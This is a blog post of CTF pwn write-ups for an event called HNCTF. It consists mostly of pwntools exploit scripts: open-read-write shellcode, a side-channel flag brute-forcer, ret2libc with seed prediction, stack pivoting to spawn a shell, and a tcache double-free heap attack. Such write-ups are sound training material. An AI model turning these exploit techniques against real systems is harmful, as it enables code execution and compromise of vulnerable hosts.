+++
date = '2025-06-09T13:16:35+08:00'
draft = false
title = 'Hnctf'

+++

## 三步走战略

这个就是一个简单的orw使用open read write  三个函数就可以实现了

```py
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
io = remote('27.25.151.198',47234)

shellcode_addr = 0x1337000

sc = asm('''
/* open('/flag', 0) */
mov rax, 2
lea rdi, [rip + filename]
xor rsi, rsi
syscall

/* read(fd, addr, 0x100) */
mov rdi, rax
mov rsi, 0x1337200
mov edx, 0x100
xor eax, eax
syscall

/* write(1, addr, 0x100) */
mov eax, 1
mov edi, 1
mov rsi, 0x1337200
mov edx, 0x100
syscall

/* exit(0) */
mov rax, 60
xor rdi, rdi
syscall

filename:
.asciz "/flag"
''')

io.sendafter(b'prepare your acceptance speech in advance.', sc)
payload = b'a'*72 + p64(shellcode_addr)
io.sendlineafter(b'Do you have anything else to say?', payload)
io.interactive()
```

## shellcode  

他和litctf的shellcode那题也很像也是一个测信道爆破的一个题目这里就不说了

这里我给出的是之前litctf的脚本，可以魔改一下

```py
from pwn import *
context(arch='amd64',os='linux')
io=0
def find(i, c):
        global io
        #io=remote("node6.anna.nssctf.cn",28831)
        #io=process('./pwn')
        io.recvuntil(b'Please input your shellcode: \n')
        sc=asm("""
        mov rax, 0
        movabs rax, 0x67616C66
        push 0
        push rax
        push rsp
        pop rdi
        xor rsi, rsi
        xor rdx, rdx
        mov rax, 2
        syscall 
        mov rsi, rdi
        mov rdi, rax
        xor rax, rax
        mov rdx, 0x100
        syscall 
        mov al, [rsp+{}]
        cmp al, {}
        jbe $
        """.format(i, c))
        io.send(sc)

        try:
                io.recv(timeout=3)
                io.close()
                return True
        except EOFError:
                io.close()
                return False

flag = ''
i=6
while True:
        l = 0x20
        r = 0x80
        while l <= r:
                m = (l + r) // 2
                if find(i, m):
                        r = m - 1
                else:
                        l = m + 1

        if l==0:
                break
        print(l)
        flag += chr(l)
        info("win!!!!!!!!!!!!!!!!!!!!!!!!! ")
        info(flag)
        i += 1

info("flag: "+flag)
```

## pdd助⼒  

这个是一个简单的libc泄露和ret2libc的一个题目，我们需要做的就是绕过他对随机数因此我们这里使用的是rand函数的一个漏洞

```py
from pwn import *
from ctypes import *
libc=CDLL('./libc.so.6')
#io=process('./pwn')
io=remote('27.25.151.198',44336)
elf=ELF('./pwn')
def guess(p):
    io.recvuntil(b'good!')
    io.sendline(str(p).encode())
def rand():
    time=libc.time(0) 
    libc.srand(time)
    p=libc.rand()%50 
    libc.srand(p%5-44174237)
    for i in range(55):
        p=libc.rand()%4+1
        guess(p)
    libc.srand(8)
    for i in range(55):
        p=libc.rand()%4+8
        guess(p)
rand()
libc=ELF('./libc.so.6')
pop_rdi=0x401483
ret=0x40101a
puts_got=elf.got['puts']
puts_plt=elf.plt['puts']
func=0x40121f
payload=b'a'*(0x38)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(func)
io.recvuntil(b'Congratulations young man.\n')
io.sendline(payload)
puts_addr=u64(io.recv(6).ljust(8,b'\x00'))
libc_base=puts_addr-libc.sym['puts']
system=libc_base+libc.sym['system']
sh=libc_base+next(libc.search(b'/bin/sh\x00'))
payload=b'a'*(0x38)+p64(pop_rdi)+p64(sh)+p64(ret)+p64(system)
io.recvuntil(b'Congratulations young man.\n')
io.sendline(payload)
io.interactive()

```

## **Stack Pivoting**

主要使用ret2libc+栈迁移就可以了

```py
from pwn import *
context(log_level='debug',arch='amd64',os='linux')
#io=process('./pwn')
io=remote('27.25.151.198',43434)
#gdb.attach(io)
elf=ELF('./pwn')
libc=ELF('./libc.so.6')
bss=0x404800
read=0x4011b7
pop_rdi=0x401263
puts_got=elf.got['puts']
puts_plt=elf.plt['puts']
leave=0x4011ce
vuln=0x4011a4
ret=0x40101a
io.recvuntil(b'can you did ?')
payload=b'a'*(0x40)+p64(bss)+p64(read)
io.send(payload)
payload=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(vuln)
payload=payload.ljust(0x40,b'\x00')
payload+=p64(bss-0x40-0x8)+p64(leave)
io.send(payload)
io.recvline()
puts_addr=u64(io.recv(6).ljust(8,b'\x00'))
libc_base=puts_addr-libc.sym['puts']
system=libc_base+libc.sym['system']
sh=libc_base+next(libc.search(b'/bin/sh\x00'))
payload=p64(pop_rdi)+p64(sh)+p64(system)
payload=payload.ljust(0x40,b'\x00')
payload+=p64(bss-0x60-0x8)+p64(leave)
io.send(payload)
io.interactive()

```

这里主要要注意的是二进制文件已经被patch过了因此我们要换命令

```tex
~/Desktop                                                           at 14:15:25
❯ ldd pwn                                                              
	linux-vdso.so.1 (0x00007ffd525da000)
	/home/kali/Desktop/hn2025/pwn1/libc.so.6 => not found
~/Desktop                                                           at 14:15:27
❯ patchelf --replace-needed /home/kali/Desktop/hn2025/pwn1/libc.so.6 ./libc.so.6 ./pwn

```

但是同样也有一个相对笨一点的方法可以使用高权限在自己本地创建一个对应的路径的文件也同样可以做



## 梦中情pwn

这个是没有给libc文件因此我们需要去ida中去看看有没有关键的版本可以看到一个是个2.34的版本因此这个是一个高版本的一个堆题

并且存在一个uaf漏洞

show部分，也是检查到当前chunck以前，以及当前chunck是否都是非0，才能输出

攻击流程：

uaf泄露堆地址和key
利用fastbin并入tcachebin打fastbin dup
建议：

先了解一下key的有关泄露方式和对fd指针的加密
先了解fastbin并入tcachebin的流程和原理
第一步：如何泄露

由于申请一个chunck必须要写入内容，并且会置零最后一位的后一位，所以我们想要泄露key必须要保证这个chunck此时是释放状态
然后tcachebin先被释放的后被申请，所以我们必须借助到fastbin

先申请8个chunck
然后按照7654321的顺序释放，为了节省我们的ptr_list中的空间，这样释放能做到全部清空，后续申请不会浪费
再释放chunck8，他在ptr_list中的值就不会被清空，同时进入了fastbin
再申请7个chunck，就会从tcachebin中取出，并且让1~7的ptr_list都不为0
此时再show(8)就可以泄露key了
同时得到堆地址

同时会把chunk8同时放入tcache和fastbin中因此我们就可以构造出一个double free 出来

后面就是吧tcache的double free进入的tcache中

```py
from pwn import * 
context(arch = 'amd64',os = 'linux')
context.log_level='debug'
count=1
gdb_flag=0
io=process('/home/fofa/vuln1/vuln')
if gdb_flag==1:
    gdb.attach(io)
def cmd(choice):
    io.recvuntil(b'4) Leaving the dream space\n')
    io.sendline(str(choice))
def add(data):
    cmd(1)
    io.recvuntil(b'characters).\n')
    io.sendline(data)
def show(index):
    cmd(2)
    io.recvuntil(b'Please select the dream number you want to access:')
    io.sendline(str(index))
def delete(index):
    cmd(3)
    io.recvuntil(b'Please select the dream number you want to access:')
    io.sendline(str(index))
payload=b'a'*4
for i in range(8):
    add(payload)
for i in range(7):
    delete(7-i)
delete(8)    
for i in range(7):
    add(payload)
#pause()
show(8)
#gdb.attach(io)
io.recvuntil(b'Reliving a slice of a dream...\n')
key=u64(io.recv(7).ljust(8,b'\x00'))>>16
info("key:"+hex(key))
heap=key<<12

delete(8)
fake_fd=key
add(p64(fake_fd))#8
add(payload)#9
add(payload)#10
for i in range(7):
    delete(7-i)
delete(8)
delete(10)
delete(9)
gdb.attach(io)
for i in range(7):
    add(payload)
fake_fd=(heap+0x2a0) ^ key
info('key:'+hex(key))
info('fake_fd:'+hex(fake_fd))
add(p64(fake_fd))
add(payload)
add(payload)
add(b'a'*8+p64(heap+0x330))
show(1)

io.interactive()

```

